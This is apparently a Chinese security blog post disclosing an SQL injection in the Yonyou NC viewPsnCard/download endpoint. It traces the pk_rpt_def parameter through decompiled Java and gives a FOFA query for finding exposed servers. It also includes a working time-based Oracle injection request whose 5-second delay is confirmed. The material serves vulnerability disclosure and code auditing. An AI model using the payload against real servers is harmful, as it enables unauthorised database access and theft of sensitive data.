---
title: "用友NC viewPsnCard/download sql注入漏洞"
source: https://mrxn.net/jswz/yonyou-nc-viewPsnCard-download-pk_rpt_def-sqli.html
asset_dir: assets/用友nc-viewpsncarddownload-sql注入漏洞
---

# 用友NC viewPsnCard/download sql注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/4/4 08:35
- 1337浏览
- [0评论](#comment)
- 32分钟阅读

深入探索

sql

软件

服务器

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B "用友")NC系统可利用/portal/pt/viewPsnCard/download接口中的 pk\_rpt\_def 参数实现sql注入，从而窃取服务器的敏感信息。

编程

# 影响版本

NC65

# fofa语法

> `app="用友-UFIDA-NC"`

# 漏洞分析

nc/bs/hrss/pub/action/PsnCardAction.class

```
package nc.bs.hrss.pub.action;

import java.io.FileInputStream;
import java.io.OutputStream;
import java.net.URLEncoder;
import nc.bs.framework.common.NCLocator;
import nc.bs.logging.Logger;
import nc.bs.ml.NCLangResOnserver;
import nc.itf.hi.IRptQueryService;
import nc.itf.hr.tools.rtf.IGenerateRTFDocument;
import nc.uap.lfw.core.exception.LfwRuntimeException;
import nc.uap.lfw.servletplus.annotation.Action;
import nc.uap.lfw.servletplus.annotation.Servlet;
import nc.uap.lfw.servletplus.core.impl.BaseAction;
import nc.vo.hi.repdef.RepDefVO;
import nc.vo.ml.NCLangRes4VoTransl;
import nc.vo.pub.BusinessException;
import nc.vo.uif2.LoginContext;
import org.apache.commons.io.IOUtils;
import uap.lfw.core.ml.LfwResBundle;

@Servlet(
    path = "/viewPsnCard"
)
public class PsnCardAction extends BaseAction {
    public PsnCardAction() {
    }

    @Action
    public void download() {
        OutputStream out = null;

        try {
            this.request.setCharacterEncoding("UTF-8");
            String pk_rpt_def = this.request.getParameter("pk_rpt_def");
            String pk_psnjob = this.request.getParameter("pk_psnjob");
            RepDefVO repDefVO = ((IRptQueryService)NCLocator.getInstance().lookup(IRptQueryService.class)).queryByPk(pk_rpt_def);
            FileInputStream finput = null;
```

`pk_rpt_def` 带入 queryByPk 函数

代码安全审计

```
public RepDefVO queryByPk(String pk) throws BusinessException {
        return (RepDefVO)(new BaseDAO()).retrieveByPK(RepDefVO.class, pk);
    }
public Object retrieveByPK(Class className, String pk) throws DAOException {
        PersistenceManager manager = null;
        Object values = null;

        try {
            manager = this.createPersistenceManager(this.dataSource);
            values = manager.retrieveByPK(className, pk);

public Object retrieveByPK(Class className, String pk, String[] selectedFields) throws DbException {
        SuperVO vo = this.initSuperVOClass(className);
        if (pk == null) {
            throw new IllegalArgumentException("pk is null");
        } else {
            SQLParameter param = new SQLParameter();
            param.addParam(pk.trim());
            List results = (List)this.retrieveByClause(className, vo.getPKFieldName() + "=?", selectedFields, param);
            return results.size() >= 1 ? results.get(0) : null;
        }
    }

public Collection retrieveByClause(Class className, String condition, String[] fields, SQLParameter parameters) throws DbException {
        BaseProcessor processor = new BeanListProcessor(className);
        return (Collection)this.session.executeQuery(this.buildSql(className, condition, fields), parameters, processor);
    }
```

最终调用 executeQuery 执行拼接的SQL语句，造成[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5 "SQL注入")漏洞。

# 漏洞复现

漏洞利用示例

漏洞预警服务

```
GET /portal/pt/viewPsnCard/download?pageId=login&pk_rpt_def=1'+and+1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',5)--&pk_psnjob=1 HTTP/1.1
HTTP/1.1
Host: nc.mrxn.net
```

[![用友NC viewPsnCard/download sql注入漏洞](images/img-001-bf2694abcfde.webp)](https://image.mrxn.net/5f1a7c1a7f7b4818bea18fd6ee50226f.webp)

成功延时 5 秒

这个洞和前面 [用友NC rmwebImage/download sql注入漏洞](https://mrxn.net/jswz/yonyou-nc-rmwebImage-download-pk_psndoc-sqli.html) 和 [用友NC rmImage/download sql注入漏洞](https://mrxn.net/jswz/yonyou-nc-rmImage-download-pk_psndoc-sqli.html) 两个洞差不多，只不过这个也是未公开的漏洞。

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读

黑客与破解
